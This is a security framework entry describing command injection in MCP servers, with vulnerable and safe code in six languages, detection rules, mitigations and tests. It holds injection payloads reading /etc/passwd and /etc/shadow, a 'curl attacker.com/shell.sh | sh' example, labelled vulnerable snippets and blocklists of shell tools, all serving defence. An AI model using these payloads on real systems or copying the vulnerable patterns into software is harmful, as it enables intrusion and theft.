# SAFE-T1101: Command Injection

## Overview

**Tactic**: Execution (ATK-TA0002), Initial Access (ATK-TA0001)

**Technique ID**: SAFE-T1101

**Severity**: Critical (default) - adjust per server privilege, network reachability, and client trust model

**First Observed**: December 2024 (Multiple MCP implementations)

**Last Updated**: 2025-09-28

## Description
Command Injection is a critical vulnerability where adversaries exploit unsanitized input in Model Context Protocol (MCP) server implementations to execute arbitrary system commands. This technique leverages the direct incorporation of user-supplied input into system commands executed by MCP servers without proper sanitization, enabling remote code execution under the server process's privileges.

According to [Trend Micro research](https://www.trendmicro.com/en_us/research/25/f/why-a-classic-mcp-server-vulnerability-can-undermine-your-entire-ai-agent.html), these vulnerabilities represent "a simple but dangerous flaw" that can undermine entire AI agent systems. The vulnerability is particularly severe because MCP servers often run with elevated privileges and have access to sensitive resources, making successful exploitation capable of leading to complete system compromise.

## Attack Vectors
- **Primary Vector**: Direct command injection through unsanitized parameters in MCP tool calls
- **Secondary Vectors**:
  - Prompt injection attacks that manipulate AI agents to call MCP tools with malicious payloads ([Microsoft, 2025](https://devblogs.microsoft.com/blog/protecting-against-indirect-injection-attacks-mcp))
  - Supply chain compromise through forked vulnerable MCP server implementations
  - Option injection through filenames or parameters starting with `-` (dash)
  - SSRF → credential theft/RCE via internal services (e.g., cloud metadata endpoints). IMDSv1 (http://169.254.169.254) allows unauthenticated access; IMDSv2 requires session tokens but remains vulnerable post-RCE. IMDSv2 uses a session token (PUT) and defaults the token response to TTL=1, reducing SSRF via open WAF/proxies, but once RCE is achieved, these controls no longer protect role credentials. Egress controls and IMDSv2 with hop-limit=1 reduce but don't eliminate risk once code execution is achieved ([AWS Security Blog](https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/))
  - SQL injection in database-connected MCP servers ([Trend Micro, 2025](https://www.trendmicro.com/en_us/research/25/f/why-a-classic-mcp-server-vulnerability-can-undermine-your-entire-ai-agent.html))

## Technical Details

### Prerequisites
- Access to an MCP client that can invoke server tools
- Target MCP server with command execution functionality
- Knowledge of the target server's tool schemas and parameters
- Understanding of shell metacharacters and command chaining syntax

### Common Injection Points & Vulnerable Functions

#### Language-Specific Vulnerable APIs

**Python** (Vulnerable → Safe):
```python
# VULNERABLE: Shell interpretation enabled
os.system(f"convert {filename} output.pdf")
subprocess.call(f"convert {filename} output.pdf", shell=True)
subprocess.run(f"convert {filename} output.pdf", shell=True)

# SAFE: No shell interpretation (Linux)
subprocess.run(["/usr/bin/magick", filename, "output.pdf"], shell=False)
# Windows: Use absolute path to avoid convert.exe (filesystem tool)
# subprocess.run([r"C:\Program Files\ImageMagick-7.1.1-Q16\magick.exe", filename, "output.pdf"], shell=False)

# Windows-specific note:
# Avoid invoking .bat/.cmd directly; Windows argument parsing may still involve
# a shell. Prefer native executables or fully controlled wrappers.
# Always use absolute binary paths to avoid PATH hijacking.
```

**Node.js** (Vulnerable → Safe):
```javascript
// VULNERABLE: Shell interpretation via exec
const { exec } = require('child_process');
exec(`convert ${filename} output.pdf`);

// SAFE: Direct command execution without shell (Linux)
const { execFile } = require('child_process');
execFile('/usr/bin/magick', [filename, 'output.pdf']);
// Windows: execFile('C:\\Program Files\\ImageMagick-7.1.1-Q16\\magick.exe', [filename, 'output.pdf']);
```

**Go** (Vulnerable → Safe):
```go
// VULNERABLE: Shell interpretation
exec.Command("/bin/sh", "-c", fmt.Sprintf("convert %s output.pdf", filename))

// SAFE: Direct command execution (Linux)
exec.Command("/usr/bin/magick", filename, "output.pdf")
// Windows: exec.Command("C:\\Program Files\\ImageMagick-7.1.1-Q16\\magick.exe", filename, "output.pdf")
```

**Ruby** (Vulnerable → Safe):
```ruby
# VULNERABLE: Shell interpretation
system("convert #{filename} output.pdf")
`convert #{filename} output.pdf`

# SAFE: Array form prevents shell interpretation (Linux)
system("/usr/bin/magick", filename, "output.pdf")
# Windows: system("C:\\Program Files\\ImageMagick-7.1.1-Q16\\magick.exe", filename, "output.pdf")
```

**PHP** (Vulnerable → Safe):
```php
// VULNERABLE: Direct shell execution
exec("convert $filename output.pdf");
shell_exec("convert $filename output.pdf");

// Safer (but still not recommended): escaping when you cannot avoid the shell
$safe_filename = escapeshellarg($filename);
exec("/usr/bin/magick $safe_filename output.pdf");
// Preferred: avoid shell entirely (e.g., Imagick PHP extension) or use a no-shell
// process API that passes argv as an array (with strict allowlists).
```

**Java** (Vulnerable → Safe):
```java
// VULNERABLE: Shell interpretation on Windows/Unix
ProcessBuilder pb = new ProcessBuilder("sh", "-c", "convert " + filename + " output.pdf");

// SAFE: Direct command array (Linux)
ProcessBuilder pb = new ProcessBuilder("/usr/bin/magick", filename, "output.pdf");
// Windows: new ProcessBuilder("C:\\Program Files\\ImageMagick-7.1.1-Q16\\magick.exe", filename, "output.pdf");
```

### Attack Flow
1. **Initial Stage**: Attacker identifies MCP server with command execution tools through enumeration or documentation review
2. **Vulnerability Discovery**: Attacker tests input parameters for command injection vulnerabilities using shell metacharacters
3. **Payload Crafting**: Malicious input is crafted using:
   - Command separators (`;`, `|`, `&&`, `||` on Unix; `&`, `|`, `&&`, `||` on Windows)
   - Substitution/Expansion: POSIX command substitution (`$()` or legacy backticks); cmd.exe variable expansion (`%VAR%`); PowerShell sub-expression (`$()`)
   - Option injection (filenames starting with `-`)
4. **Exploitation Stage**: Payload is submitted through MCP tool invocation, either directly or via prompt injection
5. **Command Execution**: Server concatenates unsanitized input into system command, executing attacker's injected commands
6. **Post-Exploitation**: Attacker gains unauthorized access, exfiltrates data, or establishes persistence

### Exploitation Techniques

#### Basic Command Injection
```json
{
  "port": "8080; cat /etc/passwd"
}
```

#### Option/Response-File Injection
```json
{
  "filename": "-o/etc/passwd"   // Treated as output flag by many tools
}
{
  "filename": "--help"          // Triggers help instead of processing
}
{
  "filename": "@/etc/shadow"     // Some tools treat @ as response-file inclusion
}
```
Note: Many tools support response files (e.g., '@list.txt'), which can be abused if
user-controlled names start with '@'. The '--' end-of-options marker is widely used
per POSIX guidelines but not universal; verify per binary and add explicit allowlists.

#### OS-Specific Metacharacters
```bash
# Unix/Linux
; | && || ` $() \n

# Windows cmd.exe
& | && || ^ %var%

# PowerShell
; | && || $() `
```

#### Advanced Techniques
According to [NodeJS Security](https://www.nodejs-security.com/blog/command-injection-vulnerability-codehooks-mcp-server-security-analysis), the Codehooks MCP Server vulnerability demonstrates a typical pattern:

```javascript
// Vulnerable implementation
const command = `lsof -i :${port}`;
exec(command, (error, stdout, stderr) => {
  // Process output
});

// Attack: port = "8080; curl http://attacker.com/shell.sh | sh"
```

### Secure Code Examples

#### Python - Production-Grade Input Validation
```python
import os
import re
import subprocess
from pathlib import Path

BASE = Path("/app/uploads").resolve()

def sanitize_filename(name: str) -> str:
    """Only allow simple basenames: no slashes, no leading dot, no leading dash"""
    if not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9._-]{0,127}", name):
        raise ValueError("Invalid filename")
    return name

def materialize_under_base(name: str) -> Path:
    """Ensure path stays within BASE directory"""
    p = (BASE / sanitize_filename(name)).resolve()
    if not str(p).startswith(str(BASE) + os.sep):
        raise ValueError("Path escape attempt")
    return p

def convert_to_pdf(user_name: str, out_name: str = "output.pdf") -> None:
    """Securely convert file to PDF"""
    src = materialize_under_base(user_name)
    out = (BASE / sanitize_filename(out_name)).resolve()

    # Linux: defend against symlink swaps with O_NOFOLLOW
    fd = os.open(str(src), os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
    try:
        src_fd_path = f"/proc/self/fd/{fd}"  # Linux-specific
        env = {"PATH": "/usr/bin:/bin"}      # Minimal, fixed PATH
        # Note: convert.exe on Windows is a filesystem tool, not ImageMagick
        subprocess.run(
            ["/usr/bin/magick", src_fd_path, str(out)],
            check=True,
            shell=False,  # Critical: Never use shell=True
            env=env,
            close_fds=True,
            timeout=30,  # Prevent DoS
        )
    finally:
        os.close(fd)
```

#### Node.js - Safe Subprocess Execution
```javascript
const { execFile } = require('node:child_process');
const path = require('node:path');

const BASE = '/app/uploads';

function sanitizeFilename(name) {
    if (!/^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$/.test(name)) {
        throw new Error('Invalid filename');
    }
    return name;
}

function convertToPdf(userFilename, callback) {
    const safeName = sanitizeFilename(userFilename);
    const fullPath = path.resolve(BASE, safeName);

    // Ensure path doesn't escape BASE
    if (!fullPath.startsWith(BASE + path.sep)) {
        throw new Error('Path traversal attempt');
    }

    // Note: convert.exe on Windows is a filesystem tool, not ImageMagick
    execFile('/usr/bin/magick', [fullPath, 'output.pdf'], {
        env: { PATH: '/usr/bin:/bin' },
        cwd: '/app/sandbox',  // Set working directory to sandbox
        windowsHide: true,
        timeout: 30000
    }, (error) => {
        if (error && error.code === 'ENOENT') {
            throw new Error('ImageMagick not found at expected path');
        }
        callback(error);
    });
}
```

#### Go - Command Execution Without Shell
```go
package main

import (
    "context"
    "fmt"
    "os/exec"
    "path/filepath"
    "regexp"
    "strings"
    "syscall"
    "time"
)

const BASE = "/app/uploads"

var filenameRegex = regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$`)

func sanitizeFilename(name string) (string, error) {
    if !filenameRegex.MatchString(name) {
        return "", fmt.Errorf("invalid filename")
    }
    return name, nil
}

func convertToPDF(userFilename string) error {
    safeName, err := sanitizeFilename(userFilename)
    if err != nil {
        return err
    }

    fullPath := filepath.Join(BASE, safeName)
    absPath, _ := filepath.Abs(fullPath)

    // Ensure path doesn't escape BASE
    if !strings.HasPrefix(absPath, BASE+string(filepath.Separator)) {
        return fmt.Errorf("path traversal attempt")
    }

    ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
    defer cancel()

    // Note: convert.exe on Windows is a filesystem tool, not ImageMagick
    cmd := exec.CommandContext(ctx, "/usr/bin/magick", absPath, "output.pdf")
    cmd.Env = []string{"PATH=/usr/bin:/bin"}
    cmd.SysProcAttr = &syscall.SysProcAttr{
        Noctty: true,  // Prevent TTY allocation
    }
    cmd.Dir = "/app/sandbox"  // Set working directory

    return cmd.Run()
}
```

## Impact Assessment
- **Confidentiality**: High - Full access to server-accessible files, credentials, and data
- **Integrity**: High - Arbitrary file modification, code injection, and system configuration changes
- **Availability**: High - Service disruption, resource exhaustion, or complete system destruction
- **Scope**: Network-wide - Potential for lateral movement and supply chain impact

### Current Status (2025)
According to [Trend Micro](https://www.trendmicro.com/en_us/research/25/f/why-a-classic-mcp-server-vulnerability-can-undermine-your-entire-ai-agent.html), Anthropic's vulnerable SQLite MCP server was forked over 5,000 times before being archived, creating an extensive supply-chain blast radius where unpatched code exists in thousands of downstream agents, many likely in production environments.

## Detection Methods

### Runtime Detection (Production-Grade)

#### Falco Rules (Container Runtime Monitoring)
```yaml
# Note: Uses Falco's built-in macros (shell_procs, spawned_process) for better accuracy
# See: https://falco.org/docs/rules/default-macros/
- rule: MCP Spawns Shell
  desc: MCP server spawned a shell inside a container
  condition: >
    container and spawned_process and
    shell_procs and
    proc.pname endswith "mcp-server"
  output: >
    MCP spawned shell (user=%user.name parent=%proc.pname
    cmd=%proc.cmdline container=%container.name)
  priority: WARNING
  tags: [attack.T1059, attack.T1059.004]

- rule: MCP Executes Suspicious Binary
  desc: MCP server executed potentially malicious binary
  condition: >
    container and spawned_process and
    proc.pname endswith "mcp-server" and
    proc.name in (curl, wget, nc, ncat, python, perl, ruby)
  output: >
    Suspicious execution from MCP (exe=%proc.name cmdline=%proc.cmdline)
  priority: WARNING
```

#### auditd Rules (Linux Kernel Audit)
```bash
# Monitor all execve calls from MCP server (both 64/32-bit where applicable)
# Note: Aggressive audit rules can impact performance; adjust buffer size and rate limits
# See: https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/security_guide/sec-understanding_audit_log_files
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/mcp-server -k mcp_exec
-a always,exit -F arch=b32 -S execve -F exe=/usr/bin/mcp-server -k mcp_exec
# Alternative using comm field (process name):
# -a always,exit -F arch=b64 -S execve -F comm=mcp-server -k mcp_exec

# Monitor shell binaries for execution (watch rules don't support -F ppid)
# To filter by parent, use execve syscall rules instead:
-w /bin/bash -p x -k mcp_shell
-w /bin/sh -p x -k mcp_shell
# Parent-specific filtering is best done in your SIEM (ppid field). Keep rules static, e.g.:
# -a always,exit -F arch=b64 -S execve -F exe=/bin/bash -k mcp_shell_spawn
```

#### Sigma Rule (Portable SIEM Detection)
```yaml
title: Linux - MCP Service Spawns Shell
id: a4b3c2d1-8e7f-4a5b-9c6d-3e2f1a0b9c8d
status: experimental
description: Detects MCP server spawning shell or suspicious binaries
logsource:
  product: linux
  category: process_creation
detection:
  selection_parent:
    ParentImage|endswith:
      - '/mcp-server'
      - '/mcp-server.js'
      - '/mcp_server.py'
  selection_child_shell:
    Image|endswith:
      - '/bin/sh'
      - '/bin/bash'
      - '/bin/dash'
      - '/bin/zsh'
  selection_child_suspicious:
    Image|endswith:
      - '/usr/bin/curl'
      - '/usr/bin/wget'
      - '/usr/bin/python'
      - '/usr/bin/nc'
  condition: selection_parent and (selection_child_shell or selection_child_suspicious)
falsepositives:
  - Legitimate MCP servers that require shell execution
level: high
tags:
  - attack.execution
  - attack.t1059
  - attack.t1059.004  # Unix Shell
  - attack.t1190      # Exploit Public-Facing Application
```

#### Windows Detection (Sysmon/Security Logs)
```yaml
title: Windows - MCP Server Spawns Shell
id: b5c4d3e2-9f8e-5b6a-0d7c-4f3g2b1a0d9f
status: experimental
description: Detects MCP server spawning cmd.exe or PowerShell on Windows
logsource:
  product: windows
  service: sysmon
detection:
  selection_sysmon:
    EventID: 1  # Process creation
    ParentImage|endswith:
      - '\mcp-server.exe'
      - '\node.exe'  # If MCP runs via Node.js
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\cscript.exe'
      - '\wscript.exe'
  selection_security:
    EventID: 4688  # Process creation (Security log)
    ParentProcessName|endswith: '\mcp-server.exe'
    NewProcessName|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
  condition: selection_sysmon or selection_security
level: high
tags:
  - attack.execution
  - attack.t1059.003  # Windows Command Shell
```

### Application-Level Detection

```yaml
# Enhanced Sigma rule for MCP logs
title: MCP Tool Parameter Command Injection Attempt
logsource:
  product: mcp
  service: server
detection:
  selection_metacharacters:
    tool_parameters|contains:
      - ';'
      - '&&'
      - '||'
      - '$('
      - '`'
  selection_option_injection:
    tool_parameters|re: '^-[a-zA-Z]'  # Parameters starting with dash (tune per context to reduce FPs)
  condition: selection_metacharacters or selection_option_injection
```

## Mitigation Strategies

### Preventive Controls

#### Input Validation Architecture
1. **Never Trust User Input**: Treat all external input as potentially malicious
2. **Use Allowlists, Not Denylists**: Define what's allowed rather than blocking known bad patterns
3. **Validate at Multiple Layers**: Input validation at API gateway, application, and subprocess layers
4. **Enforce Type Safety**: Use strongly-typed parameters where possible

#### Input Normalization & Unicode Security
**Normalize & Reject Before Validate**:
- Normalize Unicode to NFC; strip zero-width characters and control chars (`\r`, `\n`, `\t`, `\0`)
- Reject leading `-`, `@`, or a lone `-` (stdin marker). Forbid response-file semantics unless explicitly required
- Treat `--` as end-of-options only if the target binary documents it; otherwise fail-closed
- Watch for Unicode confusables: em-dash (—), en-dash (–), look-alike @ (＠), and other homoglyphs

```python
import unicodedata
import re

def normalize_and_validate(input_str: str) -> str:
    """Normalize Unicode and reject dangerous patterns"""
    # Normalize to NFC
    normalized = unicodedata.normalize('NFC', input_str)

    # Strip zero-width characters
    normalized = re.sub(r'[\u200b-\u200f\u202a-\u202e\ufeff]', '', normalized)

    # Reject control characters
    if re.search(r'[\x00-\x1f\x7f]', normalized):
        raise ValueError("Control characters not allowed")

    # Reject leading dash, @, or standalone dash
    if normalized.startswith(('-', '@')) or normalized == '-':
        raise ValueError("Dangerous prefix or stdin marker detected")

    # Reject Unicode confusables (example set)
    confusables = '—–＠'  # em-dash, en-dash, fullwidth @
    if any(char in normalized for char in confusables):
        raise ValueError("Unicode confusables detected")

    return normalized
```

#### MCP-Aware Schema Hardening
Define strict tool parameter schemas with:
```jsonc
{
  "type": "object",
  "properties": {
    "filename": {
      "type": "string",
      "pattern": "^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$",
      "not": {
        "pattern": "^[-@]"  // Forbid leading dash and @ (option/response-file injection)
      }
    },
    "port": {
      "type": "integer",
      "minimum": 1,
      "maximum": 65535
    },
    "callback_url": {
      "type": "string",
      "format": "uri",
      "pattern": "^https://(api\\.example\\.com|webhook\\.trusted\\.org)/"
    }
  }
}
```
Enforce server-side validation even if clients validate.

#### Language-Specific Safe Practices

| Language | Unsafe Functions | Safe Alternatives | Documentation |
|----------|-----------------|-------------------|---------------|
| Python | `os.system()`, `subprocess.*` with `shell=True` | `subprocess.run([...], shell=False)` | [subprocess security](https://docs.python.org/3/library/subprocess.html#security-considerations) |
| Node.js | `child_process.exec()` | `child_process.execFile()`, `child_process.spawn()` | [child_process security](https://nodejs.org/api/child_process.html#child_processexecfilefile-args-options-callback) |
| Go | `exec.Command("/bin/sh", "-c", ...)` | `exec.Command(binary, args...)` | [os/exec package](https://pkg.go.dev/os/exec) |
| Ruby | `system(string)`, backticks | `system(cmd, arg1, arg2)` | [Kernel#system](https://ruby-doc.org/core/Kernel.html#method-i-system) |
| PHP | `exec()`, `shell_exec()`, `passthru()` | Avoid shelling out; use libraries | [Program execution](https://www.php.net/manual/en/ref.exec.php) |
| Java | `Runtime.exec(string)` | `ProcessBuilder` with array | [ProcessBuilder](https://docs.oracle.com/javase/8/docs/api/java/lang/ProcessBuilder.html) |

#### Container Deployment Hardening

If deploying MCP servers in containers, apply Kubernetes Pod Security Standards 'restricted' profile and network policies to limit post-exploitation impact. See [Kubernetes Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/) for implementation details.

#### Server Policy Guardrails
**Enforce these policies at the MCP server level**:
1. **Deny shell invocation globally**: Scan code for `os.system`, `child_process.exec`, `execSync`, `Runtime.exec(String)`
2. **Allowlist absolute binaries**: Only permit execution of specific binaries at known paths
3. **Pin working directory**: Set `cwd` to a sandboxed location for all subprocess execution
4. **Drop capabilities**: Use `no_new_privs` and drop all Linux capabilities except those explicitly required
5. **Minimal PATH**: Set `PATH=/usr/bin:/bin` or even more restrictive for subprocesses

```python
# Example server policy implementation
import os
import subprocess
from pathlib import Path

class SecureMCPServer:
    ALLOWED_BINARIES = {
        '/usr/bin/magick',
        '/usr/bin/gs',
        '/usr/bin/pdftoppm'
    }

    SANDBOX_DIR = Path('/app/sandbox')

    def execute_command(self, binary: str, args: list) -> subprocess.CompletedProcess:
        """Execute command with strict policy enforcement"""
        if binary not in self.ALLOWED_BINARIES:
            raise ValueError(f"Binary {binary} not in allowlist")

        # Drop privileges if running as root (Linux)
        if os.geteuid() == 0:
            os.setgroups([])
            os.setgid(1000)  # Non-root GID
            os.setuid(1000)  # Non-root UID

        return subprocess.run(
            [binary] + args,
            shell=False,  # Never use shell
            cwd=str(self.SANDBOX_DIR),
            env={'PATH': '/usr/bin:/bin'},
            capture_output=True,
            timeout=30,
            preexec_fn=lambda: os.setpgrp()  # New process group for kill safety
        )
```

#### Network and Environment Controls
1. **Egress Filtering**: Block outbound connections from MCP servers except to required services
2. **Environment Variables**: Set minimal, explicit environment variables for subprocesses
3. **Resource Limits**: Implement CPU, memory, and file descriptor limits
4. **Syscall Filtering**: Use seccomp-bpf to restrict available system calls

### Detective Controls

#### CI/CD Security Gates
```yaml
# Semgrep rule to detect unsafe subprocess usage
# Additional tools: Python Bandit (B602/B603), Node eslint-plugin-security, grep for cmd.exe/powershell.exe
rules:
  - id: unsafe-shell-true
    patterns:
      - pattern: subprocess.$FUNC(..., shell=True, ...)
    message: "Unsafe use of shell=True in subprocess"
    severity: ERROR

  - id: nodejs-exec-usage
    patterns:
      - pattern: require('child_process').exec(...)
    message: "Use execFile or spawn instead of exec"
    severity: ERROR

  - id: java-runtime-exec-string
    patterns:
      - pattern: Runtime.getRuntime().exec($STRING)
    message: "Use ProcessBuilder with array arguments instead"
    severity: ERROR

  - id: go-shell-command
    patterns:
      - pattern: exec.Command("sh", "-c", ...)
      - pattern: exec.Command("/bin/sh", "-c", ...)
    message: "Avoid shell invocation; pass arguments directly"
    severity: ERROR

  - id: ruby-backticks
    patterns:
      - pattern-regex: '`[^`]+`'
      - pattern: system($STRING)
    message: "Use system with array arguments or Open3"
    severity: ERROR
```

### Testing Strategy

1. **Unit Tests with Property-Based Fuzzing**:
```python
import hypothesis.strategies as st
from hypothesis import given

@given(st.text())
def test_no_shell_execution(user_input):
    """Verify no shell is spawned regardless of input"""
    with patch('subprocess.run') as mock_run:
        try:
            process_user_command(user_input)
        except ValueError:
            pass  # Invalid input is fine

        # Ensure shell=False in all calls
        for call in mock_run.call_args_list:
            assert call.kwargs.get('shell', False) == False
```

2. **Runtime Assertion Tests**:
```python
def test_cannot_spawn_shell():
    """Verify MCP cannot spawn shells from user input"""
    payloads = [
        "test; /bin/sh",
        "test && bash",
        "$(bash)",
        "`sh`",
        "-o /etc/passwd",
        "@/etc/shadow",  # Response-file injection
        "test\ncat /etc/passwd",  # Newline injection
        "test—cat /etc/passwd",  # Unicode em-dash
        "test＠file.txt"  # Unicode fullwidth @
    ]

    for payload in payloads:
        # Monitor process creation during test
        # Linux: Run under strace -f -e execve or use bpftrace/execsnoop
        # Alternative: Use BCC tools for lower overhead
        # execsnoop-bpfcc -t -x | grep mcp_server
        with subprocess.Popen(['strace', '-f', '-e', 'execve',
                              'python', 'mcp_server.py'],
                             stderr=subprocess.PIPE) as proc:
            # Send payload and check strace output for shell spawns
            # Assert no shells were spawned
            shell_names = {'sh', 'bash', 'dash', 'zsh', 'cmd.exe', 'powershell.exe'}
            strace_output = proc.stderr.read().decode()
            for shell in shell_names:
                assert f'execve("/bin/{shell}"' not in strace_output
                assert f'execve("/usr/bin/{shell}"' not in strace_output
```

## Compliance Mapping

| Framework | Control | Description |
|-----------|---------|-------------|
| MITRE ATT&CK | [T1059](https://attack.mitre.org/techniques/T1059/) | Command and Scripting Interpreter |
| MITRE ATT&CK | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) | Unix Shell |
| MITRE ATT&CK | [T1059.003](https://attack.mitre.org/techniques/T1059/003/) | Windows Command Shell |
| MITRE ATT&CK | [T1190](https://attack.mitre.org/techniques/T1190/) | Exploit Public-Facing Application |
| NIST CSF 2.0 | PR.PS-01 | Configuration management practices are established and applied |
| NIST CSF 2.0 | PR.PS-05 | Prevent installation/execution of unauthorized software |
| NIST CSF 2.0 | PR.PS-06 | Secure software development practices |
| NIST CSF 2.0 | PR.AA-05 | Least privilege and separation of duties |
| ISO 27001:2022 | Annex A 8.28 | Secure coding |
| ISO 27001:2022 | Annex A 8.9 | Configuration management |
| OWASP ASVS | V5.3 | Output encoding and Injection Prevention Requirements |
| CWE | CWE-78 | OS Command Injection |

## Related Techniques
- [SAFE-T1102](../SAFE-T1102/README.md): Prompt Injection - Often used to trigger command injection
- [SAFE-T1103](../SAFE-T1103/README.md): Fake Tool Invocation - Can be combined with command injection
- [SAFE-T1105](../SAFE-T1105/README.md): Path Traversal via File Tool - Similar input validation failures
- [SAFE-T1001](../SAFE-T1001/README.md): Tool Poisoning Attack - Can include command injection payloads

## References
- [Model Context Protocol Specification](https://modelcontextprotocol.io/specification)
- [Model Context Protocol Security Best Practices](https://modelcontextprotocol.io/specification/draft/basic/security_best_practices)
- [Why a Classic MCP Server Vulnerability Can Undermine Your Entire AI Agent - Trend Micro, 2025](https://www.trendmicro.com/en_us/research/25/f/why-a-classic-mcp-server-vulnerability-can-undermine-your-entire-ai-agent.html)
- [Command Injection Vulnerability Discovered in Codehooks MCP Server - NodeJS Security, 2025](https://www.nodejs-security.com/blog/command-injection-vulnerability-codehooks-mcp-server-security-analysis)
- [Exploiting MCP Servers Vulnerable to Command Injection - Snyk, 2025](https://snyk.io/articles/exploiting-mcp-servers-vulnerable-to-command-injection/)
- [Command Injection in @cyanheads/git-mcp-server - GitHub Advisory, 2025](https://github.com/cyanheads/git-mcp-server/security/advisories/GHSA-3q26-f695-pp76)
- [MCP (Model Context Protocol) and Its Critical Vulnerabilities - Strobes, 2025](https://strobes.co/blog/mcp-model-context-protocol-and-its-critical-vulnerabilities/)
- [Model Context Protocol: Understanding security risks and controls - Red Hat, 2025](https://www.redhat.com/en/blog/model-context-protocol-mcp-understanding-security-risks-and-controls)
- [Protecting against indirect prompt injection attacks in MCP - Microsoft, 2025](https://devblogs.microsoft.com/blog/protecting-against-indirect-injection-attacks-mcp)
- [Command injection in Python: examples and prevention - Snyk](https://snyk.io/blog/command-injection-python-prevention-examples/)
- [Node.js Child Process Documentation](https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback)
- [Python subprocess Documentation - Security Considerations](https://docs.python.org/3/library/subprocess.html#security-considerations)
- [OWASP Top 10 for LLM Applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
- [Falco - Runtime Security](https://falco.org/docs/)
- [Linux Audit System](https://linux-audit.com/configuring-and-auditing-linux-systems-with-audit-daemon/)

## Version History
| Version | Date | Changes | Author |
|---------|------|---------|--------|
| 2.0 | 2025-09-28 | Major update: Added runtime detection, Kubernetes hardening, expanded vulnerable APIs, option injection, comprehensive security review feedback | fkautz |
| 1.0 | 2025-09-28 | Initial documentation based on 2024-2025 vulnerability research | SAFE-MCP Community |